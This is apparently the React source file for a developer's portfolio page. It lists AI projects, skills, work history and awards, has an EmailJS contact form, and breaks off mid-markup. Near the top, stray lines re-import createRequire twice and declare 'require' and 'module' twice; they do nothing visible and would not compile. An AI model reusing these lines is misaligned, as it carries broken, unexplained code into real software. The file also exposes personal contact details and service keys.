import React, { useState, useEffect, useRef } from 'react';
import { ChevronLeft, ChevronRight, Download, Mail, Phone, MapPin, Github, Linkedin, MessageCircleMore, ExternalLink, Menu, X } from 'lucide-react';
import "./Portfolio.css";
import emailjs from '@emailjs/browser';
import profileImage from './assets/profile.jpeg';

// import tadabbur projects images
import tadabbur1 from './assets/Tadabbur AI/1.jpeg';
import tadabbur2 from './assets/Tadabbur AI/2.jpeg';
import tadabbur3 from './assets/Tadabbur AI/3.jpeg';

// import theseus finsync images
import finsync1 from './assets/Theseus Finsync/1.png';
import finsync2 from './assets/Theseus Finsync/2.png';
import finsync3 from './assets/Theseus Finsync/3.png';

// import ai auto interviewer images
import aiAuto1 from './assets/Auto Interviewer/1.png';
import aiAuto2 from './assets/Auto Interviewer/2.png';
import aiAuto3 from './assets/Auto Interviewer/3.png';
import aiAuto4 from './assets/Auto Interviewer/4.png';
import aiAuto5 from './assets/Auto Interviewer/5.png';
import aiAuto6 from './assets/Auto Interviewer/6.png';
import aiAuto7 from './assets/Auto Interviewer/7.png';

// import benjitron images
import benjitron1 from './assets/Benjitron-9000/1.png';
import benjitron2 from './assets/Benjitron-9000/2.png';
import benjitron3 from './assets/Benjitron-9000/3.png';

// import veriqs images
import veriqs1 from './assets/Veriqs/1.png';
import veriqs2 from './assets/Veriqs/2.png';
import veriqs3 from './assets/Veriqs/3.png';
import veriqs4 from './assets/Veriqs/4.png';
import veriqs5 from './assets/Veriqs/5.png';

// import bde images
import bde1 from './assets/BDE/1.png';
import bde2 from './assets/BDE/2.png';
import bde3 from './assets/BDE/3.png';
import bde4 from './assets/BDE/4.png';
import bde5 from './assets/BDE/5.png';
import bde6 from './assets/BDE/6.png';

// import ovie images
import ovie1 from './assets/Ovie/1.png';
import ovie2 from './assets/Ovie/2.png';
import ovie3 from './assets/Ovie/3.png';
import ovie4 from './assets/Ovie/4.png';
import ovie5 from './assets/Ovie/5.png';
import { createRequire } from 'module';
import { createRequire } from 'module';

var require = createRequire(import.meta.url);
var module = { exports: {} };

const require = createRequire(import.meta.url);

const Portfolio = () => {
  const [activeSection, setActiveSection] = useState('home');
  const [selectedProject, setSelectedProject] = useState(null);
  const [currentImageIndex, setCurrentImageIndex] = useState(0);
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [scrolled, setScrolled] = useState(false);
  const [showThankYouModal, setShowThankYouModal] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [formData, setFormData] = useState({
    name: '',
    email: '',
    subject: '',
    message: ''
  });

  // Refs for scroll animations
  const aboutRef = useRef(null);
  const experienceRef = useRef(null);
  const skillsRef = useRef(null);
  const awardsRef = useRef(null);
  const projectsRef = useRef(null);
  const contactRef = useRef(null);

  // Sample project data with multiple images
  const projects = [
    {
      id: 1,
      title: "Tadabbur AI",
      description:
        "A cross-platform mobile application that curates Quranic Ayats based on user mood, offering personalized spiritual content with interactive features and user preferences.",
      images: [tadabbur1, tadabbur2, tadabbur3],
      checklist: [
        "User authentication with PostgreSQL",
        "Quranic Ayat data engineering",
        "Azure AI Search integration",
        "Intuitive React Native UI",
        "Play Store deployment"
      ],
      features: [
        "Secure login/signup",
        "Audio and text-based mood input",
        "AI-curated Quranic Ayats based on mood",
        "Reels-style scrolling of Ayats",
        "Playback controls (pause/resume)",
        "Favorites management",
        "Select from 12 reciters"
      ],
      technologies: [
        "React Native",
        "FastAPI",
        "PostgreSQL",
        "OpenAI",
        "Azure AI Search"
      ]
    },
    {
      id: 2,
      title: "AI Auto Interviewer",
      description:
        "A full-stack web platform that automates candidate interviews using AI, providing real-time evaluation, scoring, and feedback with advanced admin and user dashboards.",
      images: [aiAuto1, aiAuto2, aiAuto3, aiAuto4, aiAuto5, aiAuto6, aiAuto7],
      checklist: [
        "User authentication via Azure B2C",
        "SSO integration with Azure AD",
        "GPT-4o integration for interviews",
        "Advanced prompt engineering",
        "Interactive React-based UI",
        "Robust admin panel",
        "Multi-language support",
        "Asynchronous task handling with Celery/Redis"
      ],
      features: [
        "Google/Outlook login",
        "Audio/video interview formats",
        "Candidate face recognition",
        "AI-based scoring and feedback",
        "Multi-language interviews (e.g., Malay, English)",
        "Admin dashboard with candidate management",
        "Candidate profile update requests",
        "Excel export of candidate data",
        "Dynamic follow-up questions",
        "Interview retry mechanism",
        "Detailed dashboards for users and admins"
      ],
      technologies: [
        "React",
        "FastAPI",
        "PostgreSQL",
        "OpenAI",
        "Azure B2C",
        "Celery"
      ]
    },
    {
      id: 3,
      title: "Finsync AI",
      description:
        "An AI-powered platform that recommends optimal global banks based on user-submitted preferences, featuring SharePoint-integrated data filters, contextual retrieval, and natural language chat capabilities.",
      images: [finsync1, finsync2, finsync3],
      checklist: [
        "Excel-based data integration via SharePoint",
        "Dynamic filtering based on user input",
        "GPT-4o integration for intelligent recommendations",
        "Retrieval-Augmented Generation (RAG) pipeline for contextual insights",
        "Interactive chatbot interface with threaded memory",
        "Professional-grade UI and data visualization"
      ],
      features: [
        "Smart questionnaire for bank recommendations",
        "Detailed results with multi-criteria bank scoring",
        "Categorization of matched and mismatched banks",
        "Natural language chatbot powered by RAG and embeddings",
        "Thread-based chat history management with context recall"
      ],
      technologies: [
        "React",
        "FastAPI",
        "Python",
        "PostgreSQL",
        "OpenAI",
        "LangChain",
        "SharePoint API",
        "RAG Pipeline",
        "Chatbot"
      ]
    },
    {
      id: 4,
      title: "Benjitron-9000",
      description:
        "Benjitron-9000 is an AI-powered automation and communication platform built for public adjusting firms. It unifies Trello, Google Workspace, Telegram, and voice systems to intelligently manage claims, automate outreach, and provide natural-language control over firm operations. Featuring GPT-4o intelligence, LangGraph workflows, and Azure-triggered automations, Benjitron ensures seamless claim tracking, document handling, and compliance with human-in-the-loop oversight.",
      images: [benjitron1, benjitron2, benjitron3],
      checklist: [
        "Telegram-based conversational interface with voice and text (via Whisper)",
        "LangChain + LangGraph orchestration for contextual claim workflows",
        "Azure Functions for event-driven data ingestion and automation triggers",
        "Trello, Gmail, Google Sheets, and Calendar integrations",
        "Dynamic appraisal and mediation readiness logic",
        "Automated voice, SMS, and email communication via Twilio and Vapi",
        "AI-generated invoices and litigation update requests",
        "Human-in-the-loop approval system for sensitive actions",
        "PGVector-powered semantic search and retrieval from structured data",
        "Secure audit logging and performance analytics dashboard"
      ],
      features: [
        "Conversational command center on Telegram for claim insights and actions",
        "AI-assisted drafting of client emails, follow-ups, and reminders",
        "Outbound AI voice calls with live transfer, voicemail fallback, and logging",
        "Event-driven automation via Azure Functions for data synchronization",
        "Embeddings-based retrieval for claim context and communication history",
        "Smart appraisal and mediation readiness detection across Trello + Gmail data",
        "Invoice generation and litigation update automation",
        "Human review and confirmation for settlement and invoice actions",
        "Team productivity tracking and task-based time estimation",
        "Secure audit logs with explainable AI interactions"
      ],
      technologies: [
        "React",
        "FastAPI",
        "Python",
        "PostgreSQL",
        "PGVector",
        "LangChain",
        "LangGraph",
        "OpenAI (GPT-4o, Embeddings, Whisper)",
        "Twilio",
        "Vapi",
        "Azure Functions",
        "Telegram Bot API",
        "Google Workspace APIs",
        "Trello API"
      ]
    },
    {
      id: 5,
      title: "Veriqs",
      description:
        "Veriqs is an AI-powered due diligence platform designed for comprehensive background checks and risk analysis in Brazil and Mexico. It aggregates public data from court records and judicial databases, using AI-driven analysis to deliver detailed risk assessments. The platform helps users make informed decisions about personal interactions while ensuring full compliance with Brazilian data protection laws (LGPD). Features include multi-parameter search, instant risk classification, detailed PDF reports, and a complete credit/subscription payment system.",
      images: [veriqs1, veriqs2, veriqs3, veriqs4, veriqs5],
      checklist: [
        "Multi-parameter search by CPF, full name, or phone number",
        "AI-powered instant risk classification (Low/Medium/High)",
        "Comprehensive PDF report generation with criminal records and judicial data",
        "Google OAuth 2.0 authentication with JWT session management",
        "Stripe integration for credit purchases and unlimited subscriptions",
        "Credit-based wallet system for search transactions",
        "Admin dashboard for user management and payment monitoring",
        "Multi-language support (English, Spanish, Portuguese)",
        "IP-based geolocation tracking for audit purposes",
        "Full LGPD compliance with Brazilian data protection laws"
      ],
      features: [
        "Instant background verification with AI-driven risk assessment",
        "Detailed judicial involvement and court case analysis",
        "Search history tracking with geolocation data",
        "Credit wallet management for pay-per-search model",
        "Unlimited subscription option for frequent users",
        "Admin controls for user banning, refunds, and role management",
        "Transaction history with Stripe payment tracking",
        "Mobile-responsive design with intuitive navigation",
        "Localized safety tips for Brazil and Mexico regions",
        "Comprehensive audit logging and compliance reporting"
      ],
      technologies: [
        "React 19",
        "TypeScript",
        "Vite",
        "FastAPI",
        "Python",
        "PostgreSQL",
        "SQLAlchemy",
        "SQLModel",
        "Stripe",
        "Google OAuth 2.0",
        "JWT",
        "i18next",
        "ReportLab",
        "Axios"
      ]
    },
    {
      id: 6,
      title: "BDE (Business Data Extraction)",
      description:
        "BDE is an AI-powered document intelligence platform designed for business due diligence and acquisition analysis. It processes multiple document types, connects to QuickBooks for financial data, and uses a sophisticated 5-stage scoring pipeline to evaluate companies across 8 pillars. Features include RAG-based chat, real-time WebSocket updates, multi-tenant architecture, and comprehensive acquisition recommendations with valuation guidance.",
      images: [bde1, bde2, bde3, bde4, bde5, bde6],
      checklist: [
        "Multi-format document processing (PDF, DOCX, XLSX, PPTX, audio, images)",
        "Azure OpenAI integration (GPT-4o-mini, Embeddings, Whisper)",
        "5-stage BDE scoring pipeline with 8 evaluation pillars",
        "QuickBooks OAuth integration for financial data sync",
        "RAG-powered chat with semantic search (pgvector)",
        "Real-time WebSocket progress tracking via Redis pub/sub",
        "Multi-tenant architecture with RBAC",
        "Azure Functions for async document processing",
        "Deterministic scoring algorithm with evidence traceability",
        "Automated acquisition recommendations with valuation range"
      ],
      features: [
        "Upload and process PDF, Word, Excel, PowerPoint, images, and audio files",
        "AI-powered document chunking with embedding generation",
        "RAG chat interface with source citations",
        "QuickBooks data synchronization and ingestion",
        "8-pillar company evaluation (Financial, GTM, Customer, Product, Ops, Leadership, Ecosystem, Service/Software)",
        "Red/Yellow/Green flag detection with severity ratings",
        "Overall BDE score (0-100) with valuation multiple guidance",
        "Executive acquisition recommendation with 100-day plan",
        "Real-time scoring progress via WebSocket",
        "Multi-tenant isolation with role-based access control",
        "Customizable prompt templates",
        "Complete audit trail with evidence chunk linking"
      ],
      technologies: [
        "React 19",
        "TypeScript",
        "Vite",
        "FastAPI",
        "Python",
        "PostgreSQL",
        "pgvector",
        "SQLModel",
        "Azure OpenAI (GPT-4o-mini, Embeddings, Whisper)",
        "Azure Blob Storage",
        "Azure Queue Storage",
        "Azure Functions",
        "Redis",
        "WebSockets",
        "Azure AD (MSAL)",
        "QuickBooks API",
        "Alembic"
      ]
    },
    {
      id: 7,
      title: "Ovie AI Platform",
      description:
        "Ovie is an AI-powered business intelligence platform that combines a conversational assistant, proactive daily reports via Microsoft Teams, and multi-connector data integration (GA4, GSC, CrUX, Azure DevOps). Built on LangGraph for intelligent routing, it acts as an Optimizely specialist and co-pilot across analytics, SEO, performance, and DevOps — guiding teams through five-level troubleshooting, evidence gathering, correlation analysis, and ticket creation with full multi-tenant isolation and GDPR-compliant infrastructure.",
      images: [ovie1, ovie2, ovie3, ovie4, ovie5],
      checklist: [
        "LangGraph-based intelligent routing and multi-node orchestration",
        "Conversational AI assistant with topic management and back-references",
        "Proactive daily reports delivered via Microsoft Teams",
        "Multi-connector integration (GA4, GSC, CrUX, Azure DevOps)",
        "Dual-corpus RAG retrieval with pgvector semantic search",
        "Five-level troubleshooting pipeline with evidence correlation",
        "Three-gate validation architecture (static, single-turn, multi-turn)",
        "Multi-tenant architecture with organization-scoped RBAC",
        "DLP, audit logging, and GDPR-compliant data residency (EU-West)",
        "LangSmith observability for traces, evaluations, and experiments"
      ],
      features: [
        "Conversational assistant with natural-language intent classification",
        "Proactive Teams reports with daily and weekly highlights",
        "Optimizely expert mode with direct admin guidance",
        "Co-pilot mode for analytics, SEO, performance, and DevOps",
        "Automated incident response workflow with ticket creation",
        "Evidence-based troubleshooting with root-cause correlation",
        "Dynamic prompt assembly based on configured connectors",
        "Conversation memory with topic boundary detection",
        "Date-range clarification for ambiguous time comparisons",
        "Data validation with holiday detection and anomaly flagging",
        "Admin dashboard for connectors, users, and organization config",
        "Real-time chat with streaming responses and tool execution traces"
      ],
      technologies: [
        "Next.js 15",
        "React 19",
        "TypeScript",
        "Tailwind CSS",
        "FastAPI",
        "Python",
        "LangGraph",
        "LangChain",
        "PostgreSQL",
        "pgvector",
        "Redis",
        "Vertex AI (Gemini 2.0 Flash)",
        "Google Cloud Run",
        "Google Cloud SQL",
        "Alembic",
        "Microsoft Teams API",
        "Azure DevOps API",
        "Google Analytics 4 API",
        "Google Search Console API",
        "Chrome UX Report API",
        "LangSmith"
      ]
    }
  ];

  const skills = [
    { name: "React", level: 90 },
    { name: "React-Native", level: 90 },
    { name: "JavaScript", level: 85 },
    { name: "Node.js", level: 80 },
    { name: "Python", level: 75 },
    { name: "FastAPI", level: 80 },
    { name: "Golang", level: 80 },
    { name: "OpenAI", level: 80 },
    { name: "PostgreSQL", level: 90 },
    { name: "Vector Database", level: 90 },
    { name: "Langraph Workflows", level: 90 },
    { name: "RAG Workflows", level: 90 },
  ];

  const [canScrollLeft, setCanScrollLeft] = useState(false);
  const [canScrollRight, setCanScrollRight] = useState(true);
  const projectsGridRef = useRef(null);

  // Add these functions for carousel navigation
  const scrollProjects = (direction) => {
    const container = projectsGridRef.current;
    if (container) {
      const scrollAmount = 370; // card width + gap
      const newScrollLeft = direction === 'left'
        ? container.scrollLeft - scrollAmount
        : container.scrollLeft + scrollAmount;

      container.scrollTo({
        left: newScrollLeft,
        behavior: 'smooth'
      });
    }
  };

  const checkScrollButtons = () => {
    const container = projectsGridRef.current;
    if (container) {
      setCanScrollLeft(container.scrollLeft > 0);
      setCanScrollRight(
        container.scrollLeft < container.scrollWidth - container.clientWidth
      );
    }
  };

  // Add useEffect to check scroll buttons
  useEffect(() => {
    const container = projectsGridRef.current;
    if (container) {
      checkScrollButtons();
      container.addEventListener('scroll', checkScrollButtons);
      window.addEventListener('resize', checkScrollButtons);

      return () => {
        container.removeEventListener('scroll', checkScrollButtons);
        window.removeEventListener('resize', checkScrollButtons);
      };
    }
  }, [projects]);

  // Initialize EmailJS
  useEffect(() => {
    // Initialize EmailJS with your public key
    if (window.emailjs) {
      window.emailjs.init("FU4zv71zDwIR2cP2z"); // Replace with your EmailJS public key
    }
  }, []);

  // Smooth scroll function
  const scrollToSection = (sectionId) => {
    const element = document.getElementById(sectionId);
    if (element) {
      element.scrollIntoView({
        behavior: 'smooth',
        block: 'start'
      });
      setActiveSection(sectionId);
      setIsMenuOpen(false);
    }
  };

  // Handle project image navigation
  const nextImage = () => {
    if (selectedProject) {
      setCurrentImageIndex((prev) =>
        prev === selectedProject.images.length - 1 ? 0 : prev + 1
      );
    }
  };

  const prevImage = () => {
    if (selectedProject) {
      setCurrentImageIndex((prev) =>
        prev === 0 ? selectedProject.images.length - 1 : prev - 1
      );
    }
  };

  const handleSubmit = async () => {
    if (!formData.name || !formData.email || !formData.subject || !formData.message) {
      alert('Please fill in all fields');
      return;
    }

    setIsSubmitting(true);

    try {
      await emailjs.send(
        "service_bo3heh9",
        "template_sn4t2xm",
        {
          name: formData.name,
          email: formData.email,
          title: formData.subject,
          message: formData.message,
        },
        "FU4zv71zDwIR2cP2z"
      );

      setFormData({ name: '', email: '', subject: '', message: '' });
      setShowThankYouModal(true);
    } catch (error) {
      console.error('Error sending email:', error);
      alert('Sorry, there was an error sending your message. Please try again later.');
    } finally {
      setIsSubmitting(false);
    }
  };

  // Handle form input changes
  const handleInputChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value
    });
  };

  // Download resume function
  const downloadResume = () => {
    // Replace with your actual resume URL
    const resumeUrl = 'https://rxresu.me/umairashfaq2015/muhammad-umair-senior-software-engineer';
    const link = document.createElement('a');
    link.href = resumeUrl;
    link.download = 'Muhammad_Umair_Senior_Software_Engineer_Resume.pdf';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  // Scroll effect for navbar and animations
  useEffect(() => {
    const handleScroll = () => {
      const scrollPosition = window.scrollY;

      // Update scrolled state for navbar
      setScrolled(scrollPosition > 50);

      // Handle section active states
      const sections = ['home', 'about', 'experience', 'skills', 'awards', 'projects', 'contact'];
      const scrollPos = scrollPosition + 100;

      sections.forEach((section) => {
        const element = document.getElementById(section);
        if (element) {
          const offsetTop = element.offsetTop;
          const height = element.offsetHeight;

          if (scrollPos >= offsetTop && scrollPos < offsetTop + height) {
            setActiveSection(section);
          }
        }
      });

      // Animate sections on scroll with dynamic staggered children
      const animateOnScroll = (ref, className, childSelector) => {
        if (ref.current) {
          const rect = ref.current.getBoundingClientRect();
          const isVisible = rect.top < window.innerHeight * 0.8;

          if (isVisible && !ref.current.classList.contains(className)) {
            ref.current.classList.add(className);

            // Apply staggered animation to children
            if (childSelector) {
              const children = ref.current.querySelectorAll(childSelector);
              children.forEach((child, index) => {
                setTimeout(() => {
                  child.classList.add('fade-in');
                  child.style.animationDelay = `${(index % 4) * 0.1}s`;
                }, 0);
              });
            }
          }
        }
      };

      animateOnScroll(aboutRef, 'animate-in', '.stat');
      animateOnScroll(experienceRef, 'animate-in', '.experience-item');
      animateOnScroll(skillsRef, 'animate-in', '.skill-item');
      animateOnScroll(awardsRef, 'animate-in', '.award-item');
      animateOnScroll(projectsRef, 'animate-in', '.project-card');
      animateOnScroll(contactRef, 'animate-in');
    };

    window.addEventListener('scroll', handleScroll);

    // Cleanup
    return () => {
      window.removeEventListener('scroll', handleScroll);
    };
  }, []);

  return (
    <div className="portfolio">
      {/* Navigation */}
      <nav className={`navbar ${scrolled ? 'scrolled' : ''}`}>
        <div className="nav-container">
          <div className="nav-logo">
            <span>Portfolio</span>
          </div>

          <div className={`nav-menu ${isMenuOpen ? 'active' : ''}`}>
            {['home', 'about', 'experience', 'skills', 'awards', 'projects', 'contact'].map((item) => (
              <button
                key={item}
                className={`nav-link ${activeSection === item ? 'active' : ''}`}
                onClick={() => scrollToSection(item)}
              >
                {item.charAt(0).toUpperCase() + item.slice(1)}
              </button>
            ))}
          </div>

          <div className="nav-toggle" onClick={() => setIsMenuOpen(!isMenuOpen)}>
            {isMenuOpen ? <X size={24} /> : <Menu size={24} />}
          </div>
        </div>
      </nav>

      {/* Hero Section */}
      <section id="home" className="hero">
        <div className="hero-container">
          <div className="hero-content">
            <div className="hero-text">
              <h1 className="hero-title">
                Hi, I'm <span className="highlight">Muhammad Umair</span>
              </h1>
              <h2 className="hero-subtitle">Full Stack Senior Software Engineer</h2>
              <p className="hero-description">
                🚀 I build AI-powered, scalable software solutions with a strong focus on performance and user experience. With extensive experience across product and service domains, I specialize in end-to-end development using Python, Golang, React, and Microsoft Azure. Passionate about AI, clean architecture, and solving real-world problems.
              </p>
              <div className="hero-buttons">
                <button className="btn btn-primary" onClick={() => scrollToSection('projects')}>
                  View My Work
                </button>
                <button className="btn btn-outline" onClick={downloadResume}>
                  <Download size={20} />
                  Download Resume
                </button>
              </div>
              <div className="social-links">
                <a href="https://github.com/MuhammadUmair22" target="_blank" rel="noopener noreferrer">
                  <Github size={24} />
                </a>
                <a href="https://www.linkedin.com/in/muhammad-umair0/" target="_blank" rel="noopener noreferrer">
                  <Linkedin size={24} />
                </a>
                <a
                  href="https://wa.me/923214634016?text=Hi%2C%20I%20visited%20your%20portfolio%20and%20wanted%20to%20connect!"
                  target="_blank"
                  rel="noopener noreferrer"
                >
                  <MessageCircleMore size={24} />
                </a>
              </div>
            </div>
            <div className="hero-image">
              <div className="image-container">
                <img
                  src={profileImage}
                  alt="John Doe"
                />
                <div className="image-glow"></div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* About Section */}
      <section id="about" className="about" ref={aboutRef}>
        <div className="container">
          <h2 className="section-title">About Me</h2>
          <div className="about-content">
            <div className="about-text">
              <p>
                I'm a passionate Senior Software Engineer with 3+ years of hands-on experience in building scalable,
                AI-powered applications across both product and service-based industries.
                I specialize in end-to-end development using technologies like Python (FastAPI), Golang,
                React, and Microsoft Azure. From architecting cloud-based solutions to crafting user-friendly interfaces,
                I love solving real-world problems with clean, efficient code.
                I thrive in fast-paced environments, learn quickly, and take full ownership of the work I do—always with a focus on innovation and impact.
              </p>
              <p>
                My journey started with a Computer Science degree, and I've been constantly learning
                and adapting to new technologies. I believe in writing clean, maintainable code and
                creating user-centered applications.
              </p>
              <div className="about-stats">
                <div className="stat">
                  <span className="stat-number">7+</span>
                  <span className="stat-label">Projects Completed</span>
                </div>
                <div className="stat">
                  <span className="stat-number">3.0+</span>
                  <span className="stat-label">Years Experience</span>
                </div>
                <div className="stat">
                  <span className="stat-number">15+</span>
                  <span className="stat-label">Happy Clients</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Experience Section */}
      <section id="experience" className="experience" ref={experienceRef}>
        <div className="container">
          <h2 className="section-title">Professional Experience</h2>
          <div className="experience-timeline">
            <div className="experience-item">
              <div className="experience-header">
                <h3 className="experience-title">Software Consultant</h3>
                <span className="experience-company">10 Pearls (Service-Based Company)</span>
                <span className="experience-duration">May 2026 - Present</span>
              </div>
              <div className="experience-content">
                <h4 className="experience-category">Backend Development (Golang Microservices)</h4>
                <ul className="experience-details">
                  <li>Architected an OpenAPI-first Go microservice (Gin, Bun ORM, PostgreSQL) with 45 REST endpoints across 7 domains, using oapi-codegen to generate type-safe server stubs, request/response types, and a Go client SDK consumed by downstream services</li>
                  <li>Built a vendor-integration pipeline with webhook callbacks (GoTranscript), JSON-schema validation, transcript transformation, and a polling background worker that streams files to Google Cloud Storage and syncs records across services</li>
                  <li>Designed a versioned, JSONB-backed scoring system over 14 domain models, managed via incremental SQL migrations and tuned PostgreSQL connection pooling for service-to-service workloads</li>
                  <li>Implemented comprehensive test coverage with 88 unit tests running against a real PostgreSQL database, plus schema-validation fixtures covering valid and invalid transcript payloads</li>
                </ul>

                <h4 className="experience-category">Key Technologies</h4>
                <div className="experience-technologies">
                  <span className="tech-tag">Golang</span>
                  <span className="tech-tag">Gin</span>
                  <span className="tech-tag">Bun ORM</span>
                  <span className="tech-tag">PostgreSQL</span>
                  <span className="tech-tag">oapi-codegen</span>
                  <span className="tech-tag">OpenAPI</span>
                  <span className="tech-tag">Google Cloud Storage</span>
                  <span className="tech-tag">JSONB</span>
                  <span className="tech-tag">Microservices</span>
                </div>
              </div>
            </div>

            <div className="experience-item">
              <div className="experience-header">
                <h3 className="experience-title">Senior Software Engineer</h3>
                <span className="experience-company">Kcube.ai (Service-Based Company)</span>
                <span className="experience-duration">January 2025 - Present</span>
              </div>
              <div className="experience-content">
                <h4 className="experience-category">AI & Full Stack Development</h4>
                <ul className="experience-details">
                  <li>Built AI-powered solutions for global clients using LLM integrations, RAG pipelines, LangChain, LangGraph workflow orchestration, and multi-stage scoring pipelines with deterministic evaluation algorithms</li>
                  <li>Developed full-stack applications with React, React Native, FastAPI, and PostgreSQL with PGVector for semantic search, multi-tenant architecture, and real-time WebSocket communication</li>
                  <li>Integrated OpenAI APIs (GPT-4o, Embeddings, Whisper) for intelligent automation, interviews, content curation, document analysis, metric extraction, and acquisition recommendations</li>
                  <li>Implemented Azure services (B2C, AD, Functions, AI Search, Blob Storage, Queue Storage) for authentication, SSO, event-driven architecture, and async document processing</li>
                  <li>Built payment systems with Stripe, voice/SMS with Twilio/Vapi, QuickBooks financial data integration, and various third-party API integrations</li>
                </ul>

                <h4 className="experience-category">Key Technologies</h4>
                <div className="experience-technologies">
                  <span className="tech-tag">React</span>
                  <span className="tech-tag">React Native</span>
                  <span className="tech-tag">FastAPI</span>
                  <span className="tech-tag">Python</span>
                  <span className="tech-tag">PostgreSQL</span>
                  <span className="tech-tag">PGVector</span>
                  <span className="tech-tag">LangChain</span>
                  <span className="tech-tag">LangGraph</span>
                  <span className="tech-tag">OpenAI (GPT-4o, Embeddings, Whisper)</span>
                  <span className="tech-tag">Azure</span>
                  <span className="tech-tag">Stripe</span>
                  <span className="tech-tag">Twilio</span>
                  <span className="tech-tag">Vapi</span>
                  <span className="tech-tag">WebSockets</span>
                </div>
              </div>
            </div>

            <div className="experience-item">
              <div className="experience-header">
                <h3 className="experience-title">Software Engineer I</h3>
                <span className="experience-company">Mslm (Product-Based Company)</span>
                <span className="experience-duration">August 2023 - December 2024</span>
              </div>
              <div className="experience-content">
                <h4 className="experience-category">Backend Development (Golang)</h4>
                <ul className="experience-details">
                  <li>Architected modular Golang packages to enhance code maintainability and reusability</li>
                  <li>Optimized database operations by integrating pgx and kpgx connection pools with auto-unmarshalling, reducing runtime and memory usage</li>
                  <li>Implemented microservice architecture with a robust file server for efficient local storage and retrieval</li>
                  <li>Developed an AWS S3-like service using CephFS integration for production-grade scalable storage</li>
                  <li>Built internal SDK to streamline interactions with private APIs, improving developer productivity</li>
                  <li>Designed and optimized PostgreSQL schemas, wrote efficient queries, and managed complex migrations and transactions</li>
                  <li>Contributed to IAM system development, implementing user invitation features and enhancing security</li>
                  <li>Implemented comprehensive audit log functionality across multiple Mslm products for accountability and compliance</li>
                  <li>Developed robust notification system to enhance user engagement and real-time communication</li>
                  <li>Developed RESTful APIs ensuring high performance, low latency, and handling of edge cases for robustness</li>
                </ul>

                <h4 className="experience-category">Full Stack Development (HRMS System)</h4>
                <ul className="experience-details">
                  <li>Built HRMS system from scratch as part of a collaborative team effort</li>
                  <li>Designed and implemented attendance module schema ensuring data integrity and efficient querying</li>
                  <li>Developed filtration system for the entire Mslm platform</li>
                  <li>Created generic and reusable React/TypeScript components improving code maintainability</li>
                  <li>Engaged in bug fixing, problem-solving, and manual testing for quality assurance</li>
                  <li>Collaborated with cross-functional teams using Git/GitHub maintaining high code quality standards</li>
                </ul>

                <h4 className="experience-category">Key Technologies</h4>
                <div className="experience-technologies">
                  <span className="tech-tag">Golang</span>
                  <span className="tech-tag">PostgreSQL</span>
                  <span className="tech-tag">pgx/kpgx</span>
                  <span className="tech-tag">CephFS</span>
                  <span className="tech-tag">React</span>
                  <span className="tech-tag">TypeScript</span>
                  <span className="tech-tag">Microservices</span>
                  <span className="tech-tag">RESTful APIs</span>
                  <span className="tech-tag">IAM</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Skills Section */}
      <section id="skills" className="skills" ref={skillsRef}>
        <div className="container">
          <h2 className="section-title">Skills & Technologies</h2>
          <div className="skills-grid">
            {skills.map((skill, index) => (
              <div key={index} className="skill-item">
                <div className="skill-info">
                  <span className="skill-name">{skill.name}</span>
                  <span className="skill-percentage">{skill.level}%</span>
                </div>
                <div className="skill-bar">
                  <div
                    className="skill-progress"
                    style={{ width: `${skill.level}%` }}
                  ></div>
                </div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Awards Section */}
      <section id="awards" className="awards" ref={awardsRef}>
        <div className="container">
          <h2 className="section-title">Awards & Recognition</h2>
          <div className="awards-grid">
            <div className="award-item">
              <div className="award-header">
                <h3 className="award-title">Employee of the Year</h3>
                <span className="award-date">January 2026</span>
              </div>
              <div className="award-company">Kcube.ai</div>
              <p className="award-description">
                Awarded Employee of the Year in recognition of successfully leading and delivering high-impact projects with outstanding results.
              </p>
            </div>

            <div className="award-item">
              <div className="award-header">
                <h3 className="award-title">1st Position Holder - FYP Competition</h3>
                <span className="award-date">July 2023</span>
              </div>
              <div className="award-company">Comsats Institute of Information Technology</div>
              <p className="award-description">
                Our AI-focused product secured the prestigious first prize, showcasing its innovative edge and excellence among 150+ projects represented in Comsats FYP Competition.
              </p>
            </div>
          </div>
        </div>
      </section>

      {/* Projects Section */}
      <section id="projects" className="projects" ref={projectsRef}>
        <div className="container">
          <h2 className="section-title">Featured Projects</h2>
          <div className="projects-container">
            <button
              className="carousel-nav-btn prev"
              onClick={() => scrollProjects('left')}
              disabled={!canScrollLeft}
            >
              <ChevronLeft size={24} />
            </button>

            <div className="projects-grid" ref={projectsGridRef}>
              {projects.map((project) => (
                <div key={project.id} className="project-card">
                  <div className="project-image">
                    <img src={project.images[0]} alt={project.title} />
                    <div className="project-overlay">
                      <button
                        className="btn btn-primary"
                        onClick={() => {
                          setSelectedProject(project);
                          setCurrentImageIndex(0);
                        }}
                      >
                        View Details
                      </button>
                    </div>
                  </div>
                  <div className="project-content">
                    <h3 className="project-title">{project.title}</h3>
                    <p className="project-description">{project.description}</p>
                    <div className="project-technologies">
                      {project.technologies.map((tech, index) => (
                        <span key={index} className="tech-tag">{tech}</span>
                      ))}
                    </div>
                    {(project.liveLink || project.githubLink) && (
                      <div className="project-links">
                        {project.liveLink && (
                          <a href={project.liveLink} target="_blank" rel="noopener noreferrer" className="project-link">
                            <ExternalLink size={16} />
                            Live Demo
                          </a>
                        )}
                        {project.githubLink && (
                          <a href={project.githubLink} target="_blank" rel="noopener noreferrer" className="project-link">
                            <Github size={16} />
                            Code
                          </a>
                        )}
                      </div>
                    )}
                  </div>
                </div>
              ))}
            </div>

            <button
              className="carousel-nav-btn next"
              onClick={() => scrollProjects('right')}
              disabled={!canScrollRight}
            >
              <ChevronRight size={24} />
            </button>
          </div>
        </div>
      </section>

      {/* Contact Section */}
      <section id="contact" className="contact" ref={contactRef}>
        <div className="container">
          <h2 className="section-title">Get In Touch</h2>
          <div className="contact-content">
            <div className="contact-info">
              <h3>Let's work together!</h3>
              <p>I'm always interested in new opportunities and exciting projects.</p>
              <div className="contact-details">
                <div className="contact-item">
                  <Mail size={20} />
                  <span>umairashfaq2015@gmail.com</span>
                </div>
                <div className="contact-item">
                  <Phone size={20} />
                  <span>+92 321 4634016</span>
                </div>
                <div className="contact-item">
                  <MapPin size={20} />
                  <span>Lahore, Pakistan</span>
                </div>
              </div>
            </div>
            <div className="contact-form">
              <div className="form-group">
